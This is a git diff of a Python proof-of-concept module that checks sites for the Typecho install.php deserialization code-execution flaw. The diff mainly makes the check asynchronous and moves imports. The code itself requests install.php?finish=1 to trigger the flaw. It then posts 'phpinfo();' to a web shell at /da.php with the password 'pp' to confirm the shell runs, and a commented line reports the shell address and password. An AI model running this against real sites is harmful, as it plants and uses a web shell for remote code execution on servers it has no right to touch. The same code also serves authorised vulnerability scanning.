@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class Typecho_Install_Code_Exec_BaseVerify:
     def __init__(self, url):
@@ -21,7 +21,7 @@ class Typecho_Install_Code_Exec_BaseVerify:
             "Referer": self.url + "/install.php",
         }
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -33,21 +33,18 @@ class Typecho_Install_Code_Exec_BaseVerify:
         
         try:
             check_url = self.url + "/install.php?finish=1"
-            req = request.get(check_url, headers = self.headers)
+            req = await request.get(check_url, headers = self.headers)
             shellpath = self.url + "/da.php"
             post_data ={
                 "pp":"phpinfo();"
             }
-            check_req = request.post(self.url + "/da.php", data = post_data, headers = self.headers)
-            if r"Configuration File (php.ini) Path" in check_req.text:
-                print("存在typecho install.php反序列化命令执行漏洞...(高危)\tpayload: " + check_url + "\tshell地址: " + shellpath + "\t密码: pp")
+            check_req = await request.post(self.url + "/da.php", data = post_data, headers = self.headers)
+            if r"Configuration File (php.ini) Path" in await check_req.text():
+                # print("存在typecho install.php反序列化命令执行漏洞...(高危)\tpayload: " + check_url + "\tshell地址: " + shellpath + "\t密码: pp")
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == "__main__":
